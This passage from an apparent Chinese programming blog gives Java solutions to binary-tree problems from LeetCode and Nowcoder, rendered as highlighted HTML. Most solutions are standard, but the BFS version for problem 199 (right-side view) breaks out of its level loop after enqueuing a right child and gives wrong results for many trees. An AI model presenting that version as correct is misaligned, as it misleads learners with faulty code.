stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96. 不同的二叉搜索树"></a><a href="https://leetcode-cn.com/problems/unique-binary-search-trees/">96. 不同的二叉搜索树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numTrees</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                dp[i] += dp[j]*dp[i - j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="NC45-实现二叉树的先序-中序-后序遍历"><a href="#NC45-实现二叉树的先序-中序-后序遍历" class="headerlink" title="NC45 实现二叉树的先序,中序,后序遍历"></a><a href="https://www.nowcoder.com/practice/a9fec6c46a684ad5a3abd4e365a9d362?tpId=117&companyId=665&rp=1&ru=%252Fcompany%252Fhome%252Fcode%252F665&qru=%252Fta%252Fjob-code-high%252Fquestion-ranking&tab=answerKey">NC45 实现二叉树的先序,中序,后序遍历</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] threeOrders (TreeNode root) &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        ArrayList&lt;Integer&gt; pre = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; in = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; post = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        preOrder(root, pre);</span><br><span class="line">        inOrder(root, in);</span><br><span class="line">        postOrder(root, post);</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][pre.size()];</span><br><span class="line">        res[<span class="number">0</span>] = pre.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        res[<span class="number">1</span>] = in.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        res[<span class="number">2</span>] = post.stream().mapToInt(Integer::valueOf).toArray();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; post)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postOrder(root.left, post);</span><br><span class="line">        postOrder(root.right, post);</span><br><span class="line">        post.add(root.val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; in)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrder(root.left, in);</span><br><span class="line">        in.add(root.val);</span><br><span class="line">        inOrder(root.right, in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">(TreeNode root, ArrayList&lt;Integer&gt; pre)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pre.add(root.val);</span><br><span class="line">        preOrder(root.left, pre);</span><br><span class="line">        preOrder(root.right, pre);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-07-重建二叉树"><a href="#剑指-Offer-07-重建二叉树" class="headerlink" title="剑指 Offer 07. 重建二叉树"></a><a href="https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/">剑指 Offer 07. 重建二叉树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">int</span>[] preorder;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.preorder = preorder;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; inorder.length; i++) &#123;</span><br><span class="line">            map.put(inorder[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> recursive(<span class="number">0</span>, <span class="number">0</span> , inorder.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">recursive</span><span class="params">(<span class="type">int</span> pre_root_idx, <span class="type">int</span> in_left_idx, <span class="type">int</span> in_right_idx)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_left_idx &gt; in_right_idx) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[pre_root_idx]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> map.get(preorder[pre_root_idx]);</span><br><span class="line">        root.left = recursive(pre_root_idx + <span class="number">1</span>, in_left_idx, idx - <span class="number">1</span>);</span><br><span class="line">        root.right = recursive(pre_root_idx + idx - in_left_idx + <span class="number">1</span>, idx + <span class="number">1</span>, in_right_idx);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-26-树的子结构"><a href="#剑指-Offer-26-树的子结构" class="headerlink" title="剑指 Offer 26. 树的子结构"></a><a href="https://leetcode-cn.com/problems/shu-de-zi-jie-gou-lcof/">剑指 Offer 26. 树的子结构</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个辅助函数判断两棵树是否相等2.递归遍历A树的每一个节点作为根结点和B树进行比较</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSubStructure</span><span class="params">(TreeNode A, TreeNode B)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (A == <span class="literal">null</span> || B == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dfs(A, B) || isSubStructure(A.left, B) || isSubStructure(A.right, B);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(TreeNode a, TreeNode b)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a.val == b.val &amp;&amp; dfs(a.left, b.left) &amp;&amp; dfs(a.right, b.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-55-II-平衡二叉树"><a href="#剑指-Offer-55-II-平衡二叉树" class="headerlink" title="剑指 Offer 55 - II. 平衡二叉树"></a><a href="https://leetcode-cn.com/problems/ping-heng-er-cha-shu-lcof/">剑指 Offer 55 - II. 平衡二叉树</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(getHigh(root.left) - getHigh(root.right)) &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> isBalanced(root.left) &amp;&amp; isBalanced(root.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getHigh</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(getHigh(root.left), getHigh(root.right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-27-二叉树的镜像"><a href="#剑指-Offer-27-二叉树的镜像" class="headerlink" title="剑指 Offer 27. 二叉树的镜像"></a><a href="https://leetcode-cn.com/problems/er-cha-shu-de-jing-xiang-lcof/">剑指 Offer 27. 二叉树的镜像</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mirrorTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = mirrorTree(root.right);</span><br><span class="line">        root.right = mirrorTree(tmp);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 队列</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">mirrorTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> node.left;</span><br><span class="line">            node.left = node.right;</span><br><span class="line">            node.right = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="103-二叉树的锯齿形层序遍历"><a href="#103-二叉树的锯齿形层序遍历" class="headerlink" title="103. 二叉树的锯齿形层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal/">103. 二叉树的锯齿形层序遍历</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">zigzagLevelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    list.add(node.val);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    list.add(<span class="number">0</span>, node.val);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            flag = !flag;</span><br><span class="line">            res.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title=" 199. 二叉树的右视图"></a><a href="https://leetcode-cn.com/problems/binary-tree-right-side-view"> 199. 二叉树的右视图</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                    res.add(node.val);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//dfs</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">rightSideView</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root, <span class="type">int</span> depth)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == res.size()) &#123;</span><br><span class="line">            res.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        depth++;</span><br><span class="line">        dfs(root.right, depth);</span><br><span class="line">        dfs(root.left, depth);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="105-从前序与中序遍历序列构造"><a href="#105-从前序与中序遍历序列构造" class="headerlink" title="105. 从前序与中序遍历序列构造"></a><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal">105. 从前序与中序遍历序列构造</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; inMap;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> preorder.length;</span><br><span class="line">        inMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            inMap.put(inorder[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> myBuildTree(preorder, <span class="number">0</span>, n - <span class="number">1</span>, inorder, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TreeNode <span class="title function_">myBuildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span> pre_left, <span class="type">int</span> pre_right, <span class="type">int</span>[] inorder, <span class="type">int</span> in_left, <span class="type">int</span> in_right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (pre_left &gt; pre_right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[pre_left]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> inMap.get(preorder[pre_left]);</span><br><span class="line">        root.left = myBuildTree(preorder, pre_left + <span class="number">1</span>, pre_left + index - in_left  , inorder, in_left, index - <span class="number">1</span>);</span><br><span class="line">        root.right = myBuildTree(preorder, pre_left + index - in_left+<span class="number">1</span>, pre_right, inorder, index + <span class="number">1</span>, in_right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="102-二叉树的层序遍历-x2F-x2F"><a href="#102-二叉树的层序遍历-x2F-x2F" class="headerlink" title="102. 二叉树的层序遍历&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal">102. 二叉树的层序遍历</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                <span class="keyword">if</span> (node.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            res.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="101-对称二叉树-x2F"><a href="#101-对称二叉树-x2F" class="headerlink" title=" 101. 对称二叉树&#x2F;"></a><a href="https://leetcode-cn.com/problems/symmetric-tree"> 101. 对称二叉树</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> helper(root, root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">helper</span><span class="params">(TreeNode root, TreeNode root1)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span> &amp;&amp; root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span> &amp;&amp; root1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span> &amp;&amp; root1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root.val == root1.val &amp;&amp; helper(root.left, root1.right) &amp;&amp; helper(root.right, root1.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal">94. 二叉树的中序遍历</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基于栈， 一直往左走，然后出栈一个就进入右子树</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty() || cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       inorder(root, res);</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inorder</span><span class="params">(TreeNode root, List&lt;Integer&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inorder(root.left, res);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        inorder(root.right, res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

